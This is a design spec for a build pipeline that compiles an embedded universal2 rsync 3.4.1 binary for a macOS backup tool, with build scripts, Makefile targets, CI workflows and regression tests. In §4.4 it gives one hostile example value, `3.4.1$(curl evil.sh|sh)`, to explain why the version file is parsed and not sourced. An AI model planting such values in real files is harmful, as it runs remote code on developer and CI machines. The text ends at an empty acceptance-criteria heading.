---
title: FlashBackup Task 12a Design - Embedded GNU rsync 3.4.1 Build Pipeline
created: 2026-06-06
last_modified: 2026-06-06
author: Mahesh Mirchandani
status: draft (post round-2 multi-hat review)
supersedes: none
---

# Task 12a: Embedded GNU rsync 3.4.1 Build Pipeline Design

## 1. Context

Phase 0 dogfood session 1 (2026-06-05) surfaced that v0.1.0-core's "embedded rsync" is a placeholder shell script at `internal/rsync/bin/rsync.placeholder` printing "PLACEHOLDER rsync; awaiting Task 12a build". On a clean install with no env override, `flashbackup backup` enumerates files, runs the placeholder for T1 transfer (exit 0, no actual transfer), T2 hash-compare tags every file `not_transferred`, and the run finishes with exit status `partial`. No data is moved. CI never caught this because every e2e test sets `FLASHBACKUP_RSYNC_PATH_FOR_TEST=/opt/homebrew/bin/rsync`; the placeholder code path is never exercised end-to-end in CI.

The v0.1.0-core tag (`b39a11c`, pushed 2026-06-05) is engine-correct but build-incomplete. Phase 0 dogfood cannot honestly close on env-override-only runs.

Task 12a delivers the missing build pipeline: a script that produces a universal2 (arm64 + x86_64) GNU rsync 3.4.1 binary from upstream source, an embed mechanism that swaps it in for release builds, and the CI plumbing that gates against shipping the placeholder by mistake. Companion Task 12b adds the regression and release tests.

This spec is the round-2 multi-hat review revision. Round 1 found 9 Critical + 20 Important + 17 Minor findings; the v2 spec folded most of them in. Round 2 (CISO + Hacker + DevOps/SRE + QA + Senior Dev + Tech Lead/Architect) re-reviewed v2 and found 4 Critical + ~25 Important + ~12 Minor — round 2 was forensic ("your fix for X has a bug at line Y") rather than directional. v3 (this revision) addresses all 4 round-2 Criticals + Important clusters A-G; clusters H (reproducibility honesty) and I (GPG escalation trigger) are folded as wording tightens in §8.2 and §9.1 rather than new architecture.

## 2. Goals

1. Produce a self-contained universal2 GNU rsync 3.4.1 binary that runs on any macOS 13+ machine with zero install-time dependencies.
2. Make the dev / test build flow uninterrupted: `make build`, `go test`, and the existing e2e suite keep using the placeholder by default.
3. Make the release build flow explicit and gated against malicious tag pushes within the limits of single-maintainer trust assumptions (Section 8 risk table).
4. Gate against accidental placeholder-release at three layers: per-commit CI smoke (matrix), release-workflow CI test, and an in-repo regression test for the placeholder behavior itself.
5. Provide auditable supply chain at the limits of provenance attestation — pinned upstream version, triple-witness SHA256 cross-check (acknowledged-Samba-ecosystem), recorded binary SHA256, Sigstore build-provenance attestation, dual-published SHA256 sidecar. **What attestation proves:** GitHub Actions built this artifact on this runner from this commit. **What attestation does not prove:** byte-identical to a local build (CI is authoritative; reproducibility deferred to Plan 2+).

## 3. Non-goals

1. Code signing or notarization of the embedded rsync binary or the parent flashbackup binary. Plan 2.
2. Building rsync with optional features (openssl, zstd, lz4, xxhash). FlashBackup does not invoke any of these code paths.
3. Cross-platform builds. macOS only. Linux / Windows are not flashbackup targets.
4. Building any rsync version other than 3.4.1. Version bumps will be a future change.
5. Byte-identical reproducible builds. Go binaries embed a build epoch + commit SHA via ldflag; making them deterministic is multi-week work. Section 8.1 documents the asymmetry.
6. GPG verification of upstream rsync source. Section 4.4 documents the triple-witness-within-Samba-ecosystem caveat that justifies SHA-only with explicit limits.
7. CVE-response automation (Task 12c, queued §9.1).
8. Release/rollback runbooks (Task 12d, queued §9.1).

## 4. Locked decisions

### 4.1 Build config: Minimal

The embedded rsync is built with optional features disabled at configure time:

```
./configure \
    --disable-openssl \
    --disable-zstd \
    --disable-lz4 \
    --disable-xxhash
```

Links only against `/usr/lib/libSystem.B.dylib`. Final binary size: ~500 KB to 1 MB per architecture, ~1-2 MB universal2.

**Why Minimal:** FlashBackup uses rsync as a local-to-local file copier only. Bundling unused features adds CVE surface and binary size for code we never invoke. The features flashbackup actually uses (--xattrs, --acls, --inplace, --partial, --append) work fine in Minimal because they use libSystem syscalls on macOS, not external libraries. AC-12b-3 below verifies the --xattrs and --acls claim end-to-end.

**Reversibility:** if Plan N adds remote backup or `--compress` over network, the build script extends to bundle the needed dep then.

### 4.2 Embed swap: Build-tag selection (without touching `make build`)

Two Go files behind `//go:build` tags select the embed payload. The existing `var embeddedRsync []byte` declaration in `internal/rsync/rsync.go` moves into each tagged file; mutually exclusive build constraints prevent duplicate declaration.

```go
// internal/rsync/embed_dev.go
//go:build !embed_real_rsync

package rsync

import _ "embed"

//go:embed bin/rsync.placeholder
var embeddedRsync []byte
```

```go
// internal/rsync/embed_release.go
//go:build embed_real_rsync

package rsync

import _ "embed"

//go:embed bin/rsync.universal2
var embeddedRsync []byte
```

**Critical: the existing `make build` target stays unchanged.** `Makefile:63-68` currently builds with `-tags release` + `LDFLAGS_RELEASE` (flips `codesign.IsReleaseBuild=true`). That semantic is preserved. The placeholder-embedded `make build` artifact remains the dev/test default with the release-flagged linker output. A NEW target `make build-real-rsync` adds the `embed_real_rsync` tag on top of the existing `-tags release` to produce the real-rsync release binary. Naming chosen to NOT collide with `make release` (which a future Plan 2 may want for the tag-cut + sign + notarize sequence).

**File state:**

| Path | Status | Size | Source |
|---|---|---|---|
| `internal/rsync/bin/rsync.placeholder` | Checked in | ~100 B | Existing shell script. No change. |
| `internal/rsync/bin/rsync.universal2` | **gitignored** | ~1-2 MB | Produced by `scripts/build-rsync.sh`. |

`.gitignore` gains two lines: `internal/rsync/bin/rsync.universal2` and `/build/` (root-anchored; doesn't shadow non-root `build` dirs).

**Artifact lifecycle:** `make build` (default placeholder + release-flagged) and `make build-real-rsync` (real rsync + release-flagged) leave the same `internal/rsync/bin/` directory state visible. The build-tag selects at compile time; the unselected file's presence on disk is harmless. `make clean-rsync` (Section 5.3) removes `internal/rsync/bin/rsync.universal2` + `./build/` and echoes what it removed.

### 4.3 Invocation contexts: All four

| Context | Trigger | Action | Output |
|---|---|---|---|
| Local script | `make build-rsync` | Run `scripts/build-rsync.sh` | `internal/rsync/bin/rsync.universal2` |
| Local real-rsync build | `make build-real-rsync` | `make build-rsync` + `go build -tags 'release embed_real_rsync'` | Real-rsync flashbackup binary |
| CI smoke | Every commit on `main` + every PR; matrix across macOS 13/14/15 | Single-arch quick build + assertions | Pass/fail signal only |
| CI release | Git tag push matching `v*.*.*` OR `workflow_dispatch` (with `environment: production` manual approval) | Full universal2 build + flashbackup real-rsync build + Task 12b-B + attestation + draft upload | GitHub Release draft (MM publishes after smoke check) |

### 4.4 Upstream verification: Triple-witness (within Samba ecosystem)

Source pin lives in a dedicated file `scripts/rsync.version`:

```
# Two literal assignments only. No expansion, no command substitution.
# Parsed by build-rsync.sh via grep, NOT sourced as Bash.
RSYNC_VERSION=3.4.1
RSYNC_TARBALL_SHA256=<populated at implementation time; see protocol below>
```

`scripts/build-rsync.sh` parses these via a restricted grep regex (Section 5.1), not Bash `source`. This is a security-critical hardening from round 2: sourcing `rsync.version` as Bash would have made any PR landing `RSYNC_VERSION=3.4.1$(curl evil.sh|sh)` execute arbitrary code on every CI run and every dev machine. Parse-don't-source closes that vector.

CI's `actions/cache@v4` keys on `hashFiles('scripts/rsync.version')` — refactoring the script body does NOT invalidate the tarball cache.

**Implementer protocol at constant population time** (locked by review):

Populate `RSYNC_TARBALL_SHA256` only after the implementer has verified it matches the SHA256 in **three witnesses, all within the Samba ecosystem with explicit independence caveat**:

1. Homebrew's `Formula/r/rsync.rb` (`brew tap homebrew/core; cat Formula/r/rsync.rb | grep sha256`).
2. A Linux distro package recipe (Debian source-package `rsync_3.4.1.orig.tar.gz` SHA256 from packages.debian.org, OR Arch's `rsync` PKGBUILD).
3. The rsync-announce mailing list announcement for 3.4.1 (https://lists.samba.org/archive/rsync-announce/).

**Independence caveat (per round-2 Hacker N4):** all three witnesses ultimately derive from samba.org. A single compromise at samba.org at announcement time poisons all three. Independence is therefore "best available without a genuinely-external mirror"; truly-independent verification would require a Samba-ecosystem-external mirror with its own GPG chain (e.g. Gentoo Manifest, Crater) — escalated to Plan 2 as part of GPG consideration. **What triple-witness defends against:** post-pin substitution at any single channel. **What it does not defend against:** pre-pin samba.org compromise.

**Attestation file** (round-2 CISO I1 fix): create `scripts/rsync.version.attestation` alongside `scripts/rsync.version`:

```
# Attestation for rsync.version - witnesses observed at constant-population time.
# All three lines must record the SAME SHA256 OR halt and surface discrepancy.
Witness-Homebrew: <sha256> (Formula/r/rsync.rb @ <commit-sha>) observed YYYY-MM-DD
Witness-Debian:   <sha256> (packages.debian.org rsync_3.4.1) observed YYYY-MM-DD
Witness-Announce: <sha256> (rsync-announce 3.4.1 mail thread) observed YYYY-MM-DD
```

A CI lint job (`actions-lint` workflow, Section 5.4) fails if the attestation file is missing, mismatched, or older than 90 days from the `rsync.version` modification date.

**Primary download channel: GitHub mirror.** Once the constant is verified, the tarball is uploaded once as a permanent GitHub Release artifact of flashbackup itself, at a never-changing tag `upstream-mirror/rsync-3.4.1`:

```bash
PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror/rsync-3.4.1.tar.gz"
FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-3.4.1.tar.gz"
```

Both URLs serve identical bytes (SHA-pinned). Primary insulates us from samba.org outages at release time. Fallback handles the case where flashbackup's GitHub assets are unreachable.

**Bootstrap procedure (round-2 DevOps I1 fix):** the very first release cannot use the GitHub mirror because the `upstream-mirror/rsync-3.4.1` tag does not yet exist. Documented procedure for first-release bootstrap:

1. After populating `rsync.version` + `rsync.version.attestation`, manually download the tarball from samba.org.
2. Run `./scripts/build-rsync.sh --verify-only` (a new mode that downloads + verifies SHA but skips build). Confirm SHA matches all three witnesses.
3. Manually create GitHub Release `upstream-mirror/rsync-3.4.1` and upload the verified tarball.
4. Subsequent releases use `PRIMARY_URL` automatically. This bootstrap is a one-time-per-version step (re-runs only on rsync version bumps).

This procedure lives in `docs/runbooks/rsync-version-bump.md` (Task 12d, §9.1).

### 4.5 Companion Task 12b: Tightened regression tests with externally-verified content equality

**Task 12b-A: Placeholder regression guard**

File: `test/e2e/placeholder_rejection_test.go` (new). Build tag: default (no `embed_real_rsync`).

Contract: when flashbackup is built with the default (placeholder) embed, a backup of any non-empty source produces:
- Exit code 1
- Exit status `partial`
- `bytes_transferred = 0`
- **The string `PLACEHOLDER rsync` appears in `rsync.log`** (proves extract → exec actually happened — confirmed by reading `internal/runner/t2_transfer.go` PassThrough behavior during round 2; the placeholder's stdout pipes to rsync.log)

**Task 12b-B: Real-rsync release guard with externally-verified content equality**

File: `test/e2e/embedded_real_rsync_test.go` (new). Build tag: `embed_real_rsync`.

Pre-check: `t.Skip("requires make build-rsync first")` if `internal/rsync/bin/rsync.universal2` does not exist.

Assertions, after init + extended-pathological-fixture backup with no env override:
- Exit 0, exit status `ok`, `bytes_transferred > 0`
- **Externally-verified per-file content equality.** For every file in the fixture: compute source SHA256 via `internal/hash.StreamSHA256` (the manifest's path) AND dest SHA256 via `exec.Command("/usr/bin/shasum", "-a", "256", destPath)` (an INDEPENDENT external process, never sharing the manifest's hash code path). Assert source SHA256 == dest SHA256 from independent sources. This closes the "rsync silently corrupted" gap — manifest-internal verification of manifest-internal hashes proves nothing (round-2 QA C1').
- **Recursive content-tree equality.** `exec.Command("/usr/bin/diff", "-rq", sourcePath, destPath)` reports no differences. (Note: `diff -rq` is content-only; xattr/ACL/flags survival are SEPARATE assertion layers, not implied by `diff -rq` passing.)
- **xattr survival** (separate layer): for each fixture file with an xattr, assert `xattr -l <destPath>` output contains the same `user.flashbackup-test=<value>` line as the source.
- **ACL survival** (separate layer): for each fixture file with an ACL entry, assert `ls -le <destPath>` output contains an ACL entry with the same `<recorded_user>: allow read` semantics. The recorded user is captured at fixture-generation time via a one-time `whoami` call and embedded in the test's expectation map — the test does NOT hardcode `runner` or `maheshm`; it compares against the recorded user from generation time. Same user is used for the source ACL write.
- **Linkage regression**: `exec.Command("/usr/bin/otool", "-L", "-arch", "arm64", "internal/rsync/bin/rsync.universal2")` reports only `libSystem.B.dylib`; same for `-arch x86_64`. Two arch-specific calls avoid the universal2 multi-header parsing fragility.
- **rsync version match**: `exec.Command(extractedRsyncPath, "--version")` first line matches regex `^rsync\s+version 3\.4\.1`.

**Fixture: extend `test/fixtures/pathological/` instead of creating a fourth category** (round-2 Tech Lead Important 3).

The existing `pathological/` fixture already covers items (a)-(f) of round-1's locked composition: bell/esc-char filenames, NFC/NFD twin, control file, chflags-uchg file, deeply-nested long path, sparse file. We EXTEND `pathological/mkfixtures.sh` to add:

- (g) **xattr-bearing file** `xattr-target.txt` — `mkfixtures.sh` writes content + immediately writes `xattr -w user.flashbackup-test "smoke-value-$(date +%s)" xattr-target.txt` at the final location (no copy/tar/mv after — preserves xattr per QA N1).
- (h) **ACL-bearing file** `acl-target.txt` — `mkfixtures.sh` writes content + records `$(whoami)` to a sidecar file `acl-target.user` + applies `chmod +a "user:$(whoami) allow read" acl-target.txt`. The sidecar file is consumed by 12b-B for the recorded-user comparison; cleanup must remove the ACL before `t.TempDir()` removal else macOS may refuse the unlink.

`pathological/MANIFEST.txt` is amended to document (g) and (h). The `pathological/_MatchesManifest` tripwire test (introduced in Task 42a) re-baselines on the extended fixture.

12b-B's "tiny fixture" reference uses `pathological/` post-extension. NO new `test/fixtures/12b-b/` directory is created.

### 4.6 CI YAML: Permissions, manual gate, attestation, action SHA pins, anti-regression lints

All third-party actions pinned to commit SHA, not floating major tag. Permissions least-privilege at job level. Release workflow uploads `draft: true` and gates on `environment: production`. `actions/attest-build-provenance@v1` produces SLSA-style provenance. **New CI lint workflow** (round-2 Hacker N6 + CISO I1) gates against floating action tags and stale rsync.version.attestation.

Detailed YAML in Section 5.4.

## 5. Architecture

### 5.1 Build script structure (`scripts/build-rsync.sh`)

```
#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

# --- PATH hygiene at script entry (per round-2 Hacker I5) ---
export PATH="/usr/bin:/bin:/usr/sbin:/sbin"

# --- mode flag ---
SMOKE_MODE=0
VERIFY_ONLY=0
case "${1:-}" in
    --smoke)        SMOKE_MODE=1 ;;
    --verify-only)  VERIFY_ONLY=1 ;;
    "")             ;;
    *)              echo "FATAL: unknown flag '$1'" >&2; exit 1 ;;
esac

# --- prereq check ---
for tool in clang lipo shasum curl tar make grep cut; do
    if ! command -v "${tool}" >/dev/null; then
        echo "FATAL: required tool '${tool}' not on PATH" >&2
        echo "  on macOS, install Xcode Command Line Tools: xcode-select --install" >&2
        exit 1
    fi
done

# --- paths ---
PROJECT_ROOT="$(pwd)"
WORK_DIR="${PROJECT_ROOT}/build"
CACHE_DIR="${WORK_DIR}/cache"
SRC_DIR="${WORK_DIR}/src"
ARM64_BUILD_DIR="${WORK_DIR}/arm64"
AMD64_BUILD_DIR="${WORK_DIR}/amd64"
OUTPUT_PATH="${PROJECT_ROOT}/internal/rsync/bin/rsync.universal2"

# --- parse-don't-source rsync.version (per round-2 Hacker N1) ---
VERSION_FILE="$(dirname "$0")/rsync.version"
if [[ ! -f "${VERSION_FILE}" ]]; then
    echo "FATAL: ${VERSION_FILE} not found" >&2
    exit 1
fi
RSYNC_VERSION="$(grep -E '^RSYNC_VERSION=[A-Za-z0-9.-]+$' "${VERSION_FILE}" | cut -d= -f2)"
RSYNC_TARBALL_SHA256="$(grep -E '^RSYNC_TARBALL_SHA256=[a-f0-9]{64}$' "${VERSION_FILE}" | cut -d= -f2)"
if [[ -z "${RSYNC_VERSION}" || -z "${RSYNC_TARBALL_SHA256}" ]]; then
    echo "FATAL: ${VERSION_FILE} malformed (RSYNC_VERSION or RSYNC_TARBALL_SHA256 missing or non-literal)" >&2
    exit 1
fi
MIN_MACOS="13.0"

# --- diagnostic trap: armed AFTER prereqs and version parse ---
trap 'on_error' ERR
on_error() {
    if [[ -f "${ARM64_BUILD_DIR}/config.log" ]]; then
        echo "FAILED. See ${ARM64_BUILD_DIR}/config.log (and amd64/) for build details." >&2
    elif [[ -d "${SRC_DIR}" ]]; then
        echo "FAILED during build setup. ${SRC_DIR} preserved for inspection." >&2
    else
        echo "FAILED before build started. See output above." >&2
    fi
}

# --- upstream URLs ---
PRIMARY_URL="https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror/rsync-${RSYNC_VERSION}.tar.gz"
FALLBACK_URL="https://download.samba.org/pub/rsync/src/rsync-${RSYNC_VERSION}.tar.gz"

# --- download + verify (curl diagnostics NOT suppressed per round-2 Senior Dev I2) ---
download_and_verify_tarball() {
    mkdir -p "${CACHE_DIR}"
    local tarball="${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz"

    if [[ -f "${tarball}" ]] && \
       [[ "$(shasum -a 256 "${tarball}" | cut -d' ' -f1)" == "${RSYNC_TARBALL_SHA256}" ]]; then
        echo "tarball cached + verified"
        return
    fi

    # Try primary (GitHub mirror); fall back to samba.org. Diagnostics flow through.
    echo "downloading from primary mirror..." >&2
    if ! curl -fSL --progress-bar -o "${tarball}.tmp" "${PRIMARY_URL}"; then
        echo "primary mirror unreachable; falling back to samba.org" >&2
        curl -fSL --progress-bar -o "${tarball}.tmp" "${FALLBACK_URL}"
    fi

    local got
    got="$(shasum -a 256 "${tarball}.tmp" | cut -d' ' -f1)"
    if [[ "${got}" != "${RSYNC_TARBALL_SHA256}" ]]; then
        echo "FATAL: tarball SHA256 mismatch" >&2
        echo "  expected: ${RSYNC_TARBALL_SHA256}" >&2
        echo "  got:      ${got}" >&2
        echo "  (got HTML error page from a CDN? primary returned 200 with non-tarball body? inspect ${tarball}.tmp)" >&2
        # Preserve tmp for inspection.
        exit 1
    fi
    mv "${tarball}.tmp" "${tarball}"
    echo "tarball downloaded + verified"
}

extract_sources() {
    rm -rf "${SRC_DIR}"
    mkdir -p "${SRC_DIR}"
    tar -xzf "${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz" -C "${SRC_DIR}" --strip-components=1
}

build_arch() {
    local arch="$1"
    local build_dir="$2"
    rm -rf "${build_dir}"
    mkdir -p "${build_dir}"

    (cd "${build_dir}" && \
     CC="clang -arch ${arch} -mmacosx-version-min=${MIN_MACOS}" \
     "${SRC_DIR}/configure" \
        --disable-openssl \
        --disable-zstd \
        --disable-lz4 \
        --disable-xxhash \
        --build="${arch}-apple-darwin" \
        --host="${arch}-apple-darwin")

    (cd "${build_dir}" && make -j"$(sysctl -n hw.ncpu)")
}

lipo_universal() {
    mkdir -p "$(dirname "${OUTPUT_PATH}")"
    lipo -create -output "${OUTPUT_PATH}" \
        "${ARM64_BUILD_DIR}/rsync" \
        "${AMD64_BUILD_DIR}/rsync"
    chmod 0755 "${OUTPUT_PATH}"
}

emit_audit() {
    echo
    echo "=== build complete ==="
    if [[ ${SMOKE_MODE} -eq 1 ]]; then
        file "${ARM64_BUILD_DIR}/rsync"
        echo "SHA256: $(shasum -a 256 "${ARM64_BUILD_DIR}/rsync" | cut -d' ' -f1)"
        "${ARM64_BUILD_DIR}/rsync" --version | head -1
    else
        file "${OUTPUT_PATH}"
        echo "SHA256: $(shasum -a 256 "${OUTPUT_PATH}" | cut -d' ' -f1)"
        otool -L -arch arm64 "${OUTPUT_PATH}"
        otool -L -arch x86_64 "${OUTPUT_PATH}"
        "${OUTPUT_PATH}" --version | head -1
    fi
}

main() {
    if [[ ${VERIFY_ONLY} -eq 1 ]]; then
        download_and_verify_tarball
        echo "verify-only mode: tarball SHA matches pin. No build performed."
        return
    fi
    download_and_verify_tarball
    extract_sources
    build_arch "arm64" "${ARM64_BUILD_DIR}"
    if [[ ${SMOKE_MODE} -eq 0 ]]; then
        build_arch "x86_64" "${AMD64_BUILD_DIR}"
        lipo_universal
    fi
    emit_audit
}

main "$@"
```

**Idempotency contract:**
- Every `make build-rsync` is a clean build of rsync itself; per-arch `build/` subdirs are `rm -rf`'d at the start of `build_arch`.
- Only `build/cache/` survives across runs.
- `./build/` is otherwise disposable. `make clean-rsync` removes it.
- On failure, `./build/<arch>/config.log` and `./build/src/` are NOT cleaned (next run's start does cleanup); maintainer inspects.

**`scripts/rsync.version`** (security-locked format):

```
# scripts/rsync.version - upstream rsync pin for FlashBackup.
#
# Two bare-literal assignments only. No quotes, no expansion, no
# command substitution. Parsed by build-rsync.sh via grep, NOT
# sourced as Bash (sourcing would enable arbitrary code execution
# at build time).
#
# Bump procedure:
#   1. Edit RSYNC_VERSION below.
#   2. Compute new RSYNC_TARBALL_SHA256 (see runbooks/rsync-version-bump.md).
#   3. Update scripts/rsync.version.attestation with three witness SHAs
#      observed within 90 days of this edit.
#   4. Run scripts/build-rsync.sh --verify-only locally to confirm.
#   5. Upload tarball to upstream-mirror/rsync-X.Y.Z Release.
#   6. Commit + push; CI lint enforces attestation freshness.
RSYNC_VERSION=3.4.1
RSYNC_TARBALL_SHA256=<populated at implementation time>
```

### 5.2 Go-side embed selection

The `var embeddedRsync []byte` declaration is **removed from `internal/rsync/rsync.go`** and re-declared in each of the two new tag-gated files (Section 4.2). Build tags are mutually exclusive — exactly one declaration is in scope at compile time.

The rest of `rsync.go` is untouched: `EmbeddedSHA256()`, `EnsureExtracted()`, the SHA256 verify-from-disk fast path, tmp+rename atomicity.

**Implementer audit at task start** (round-2 carryover from CISO Minor 5 / Hacker M8): confirm `EnsureExtracted` (a) creates the tmp file with `O_EXCL` under a 0700 dir, (b) re-verifies SHA256 of the file AFTER rename, (c) applies `chflags uchg` AFTER rename. These properties make the SHA-keyed extract path's integrity guarantee load-bearing. Document the audit result inline in `rsync.go` doc comment if changes were needed.

### 5.3 Makefile additions

Existing `make build` semantics are PRESERVED. New targets added below it.

```makefile
# Existing (unchanged): make build → -tags release + placeholder rsync.

.PHONY: build-rsync
build-rsync:
	./scripts/build-rsync.sh

.PHONY: build-rsync-smoke
build-rsync-smoke:
	./scripts/build-rsync.sh --smoke

.PHONY: build-rsync-verify
build-rsync-verify:
	./scripts/build-rsync.sh --verify-only

.PHONY: build-real-rsync
build-real-rsync: build-rsync
	go build $(GOFLAGS) -tags 'release embed_real_rsync' -ldflags "$(LDFLAGS_RELEASE)" -o flashbackup ./cmd/flashbackup

.PHONY: clean-rsync
clean-rsync:
	@rm -rf ./build
	@rm -f ./internal/rsync/bin/rsync.universal2
	@echo "removed: ./build/ and ./internal/rsync/bin/rsync.universal2"

.PHONY: test-embed-placeholder
test-embed-placeholder:
	go test ./test/e2e/... -run TestPlaceholderRejection

.PHONY: test-embed-real-rsync
test-embed-real-rsync: build-rsync
	go test -tags 'release embed_real_rsync' ./test/e2e/... -run TestEmbeddedRealRsync
```

Both `-tags 'release embed_real_rsync'` together: the existing `release` tag stays (preserves codesign.IsReleaseBuild=true wire); `embed_real_rsync` selects the universal2 embed. Existing `LDFLAGS_RELEASE` reused unchanged.

### 5.4 CI plumbing

Three CI surface changes:
1. `.github/workflows/ci.yml`: new `build-rsync-smoke` job (matrix).
2. `.github/workflows/release.yml`: new file.
3. `.github/workflows/actions-lint.yml`: new file — enforces floating-action-tag detection + rsync.version.attestation freshness.

**Per-commit smoke** (`.github/workflows/ci.yml`, new job):

```yaml
build-rsync-smoke:
  strategy:
    fail-fast: false
    matrix:
      os: [macos-13, macos-14, macos-15]
  runs-on: ${{ matrix.os }}
  timeout-minutes: 10
  permissions:
    contents: read
  steps:
    - uses: actions/checkout@<PINNED_SHA>   # v4.1.7
    - name: Cache rsync tarball
      uses: actions/cache@<PINNED_SHA>
      with:
        path: build/cache
        key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}
        # NO restore-keys: prefix fallback re-opens cache poisoning per round-2 Hacker N3.
    - name: Smoke-build rsync (single arch)
      run: ./scripts/build-rsync.sh --smoke
    - name: Assert version + linkage + help
      run: |
        ./build/arm64/rsync --version | head -1 | grep -q "version 3.4.1"
        ./build/arm64/rsync --help >/dev/null
        # Linkage: assert ONLY libSystem.B.dylib. Anchor on dylib path lines per round-2 QA N4.
        otool_out="$(otool -L ./build/arm64/rsync)"
        if echo "$otool_out" | grep -E '^\s+/' | grep -v 'libSystem\.B\.dylib' | grep -q '\.dylib'; then
          echo "FATAL: linkage to non-libSystem dylib detected" >&2
          echo "$otool_out" >&2
          exit 1
        fi
```

**Release workflow** (`.github/workflows/release.yml`, new file):

```yaml
name: Release
on:
  push:
    tags: ['v*.*.*']
  workflow_dispatch:

permissions:
  contents: write          # release upload
  attestations: write      # provenance
  id-token: write          # OIDC for attestation

jobs:
  release:
    runs-on: macos-14
    timeout-minutes: 45    # bumped from 30 per round-2 DevOps I7
    environment: production   # manual approval gate
    steps:
      - uses: actions/checkout@<PINNED_SHA>
      - uses: actions/setup-go@<PINNED_SHA>
        with:
          go-version-file: 'go.mod'
      - name: Cache rsync tarball
        uses: actions/cache@<PINNED_SHA>
        with:
          path: build/cache
          key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}
      - name: Build rsync universal2
        run: make build-rsync
      - name: Build real-rsync flashbackup binary
        run: make build-real-rsync
      - name: Task 12b-B real-rsync e2e
        run: make test-embed-real-rsync
      - name: Compute artifact SHA256
        run: shasum -a 256 ./flashbackup > flashbackup.sha256
      - name: Generate build provenance attestation
        uses: actions/attest-build-provenance@<PINNED_SHA>
        with:
          subject-path: ./flashbackup
      - name: Upload to GitHub Release (DRAFT)
        uses: softprops/action-gh-release@<PINNED_SHA>
        with:
          draft: true
          body: |
            ## v${{ github.ref_name }}
            SHA256: ${{ env.FLASHBACKUP_SHA256 }}
            Provenance: see attestation tab.
          files: |
            flashbackup
            flashbackup.sha256
```

**OIDC vs environment-approval ordering** (round-2 DevOps I2 confirmation): GitHub issues OIDC tokens per-job, AFTER the `environment: production` approval gate fires. Attestation step therefore runs post-approval against a build that human reviewed. Workflow assumes this ordering; if GitHub changes it, this spec needs revision.

**Anti-regression lint workflow** (`.github/workflows/actions-lint.yml`, new file, round-2 Hacker N6 + CISO I1):

```yaml
name: Actions lint
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - uses: actions/checkout@<PINNED_SHA>
      - name: Detect floating action tags
        run: |
          # All third-party action `uses:` lines must be commit SHAs (40 hex chars), not version tags.
          if grep -rE 'uses: [^@]+@v[0-9]' .github/workflows/; then
            echo "FATAL: floating-tag action reference detected (use commit SHA)" >&2
            exit 1
          fi
      - name: Enforce rsync.version.attestation freshness
        run: |
          if [[ ! -f scripts/rsync.version.attestation ]]; then
            echo "FATAL: scripts/rsync.version.attestation missing" >&2
            exit 1
          fi
          # Three witness SHAs must all be identical.
          witness_shas=$(grep -E '^Witness-' scripts/rsync.version.attestation | awk '{print $2}' | sort -u | wc -l | tr -d ' ')
          if [[ "$witness_shas" != "1" ]]; then
            echo "FATAL: rsync.version.attestation witnesses disagree (unique SHA count: $witness_shas)" >&2
            exit 1
          fi
          # Attestation must be within 90 days of rsync.version's last edit.
          ver_mtime=$(git log -1 --format=%ct -- scripts/rsync.version)
          att_mtime=$(git log -1 --format=%ct -- scripts/rsync.version.attestation)
          if (( att_mtime + 7776000 < ver_mtime )); then
            echo "FATAL: rsync.version.attestation is older than 90 days before rsync.version edit" >&2
            exit 1
          fi
```

**Cache write scoping** (round-2 DevOps M7 clarification): `actions/cache@v4` has built-in protection — PRs from forks can read but not write to the cache. The `if: github.ref == 'refs/heads/main'` belt-and-suspenders mentioned in earlier drafts is unnecessary; removed.

**Bootstrap procedure for `upstream-mirror/<version>` GitHub Release:** see `docs/runbooks/rsync-version-bump.md` (Task 12d, §9.1).

**Plan 2 release-pipeline restructure (round-2 Tech Lead Important 1):**

When Plan 2 lands codesign + notarize + staple, the release.yml step order MUST change as follows (NOT just "added between Build and SHA256"):

1. Build rsync universal2
2. Build real-rsync flashbackup binary
3. **Codesign flashbackup binary**
4. **`notarytool submit --wait`**
5. **`stapler staple flashbackup`** ← stapling mutates the binary
6. **Task 12b-B against the stapled binary** ← must test what we ship, not pre-staple
7. Compute SHA256 of the stapled binary
8. Generate build-provenance attestation against the stapled artifact (subject-path = stapled binary)
9. Upload draft

The current v3 spec's step order (build → 12b-B → SHA256 → attestation → upload) is correct for 12a (pre-Plan-2). Plan 2 cannot just append codesign steps; it MUST reorder so test/SHA/attestation operate on the stapled artifact. This is documented here so Plan 2's release-workflow rewrite isn't surprised.

## 6. Test strategy

| Layer | Test | Location | Build mode | Purpose |
|---|---|---|---|---|
| Unit | `internal/rsync` package | `internal/rsync/*_test.go` | Default (placeholder) | Existing tests + Task 12a audit confirms tmp+rename + chflags ordering |
| Script (negative) | Tarball SHA mismatch | `scripts/build-rsync.test.sh` (new) | Mutate cached tarball; assert exit 1 + mismatch message |
| Script (negative) | Missing prereq | Same | PATH stripped of clang; assert prereq error |
| Script (negative) | Corrupted cache | Same | Bit-flip cached tarball mid-test; assert re-verify catches loudly (round-2 QA N5) |
| Script (negative) | Partial-make recovery | Same | `pkill make` mid-build; re-run; assert clean recovery (round-2 QA N5) |
| E2E | Placeholder rejection (12b-A) | `test/e2e/placeholder_rejection_test.go` | Default | Lock placeholder behavior + extract→exec proof via rsync.log |
| E2E | Real-rsync release (12b-B) | `test/e2e/embedded_real_rsync_test.go` | `-tags 'release embed_real_rsync'` | External SHA256 content equality + diff -rq tree equality + xattr + ACL preservation + per-arch linkage |
| CI smoke | Per-commit script | GitHub Actions matrix [macos-13/14/15] | --smoke | Catch script regressions across supported macOS versions |
| CI actions-lint | Per-commit YAML/attestation | GitHub Actions | n/a | Floating-tag detection + rsync.version.attestation freshness |
| CI release | Full release workflow | GitHub Actions `release.yml` | `-tags 'release embed_real_rsync'` | Audited draft release with provenance |

**Cross-test sequencing** (round-2 QA N6): each e2e test uses its own `t.TempDir()` for the dest USB and source fixture. Neither references `./build/` directly. 12b-A and 12b-B can run in any order or in parallel.

## 7. Acceptance criteria

**Task 12a:**

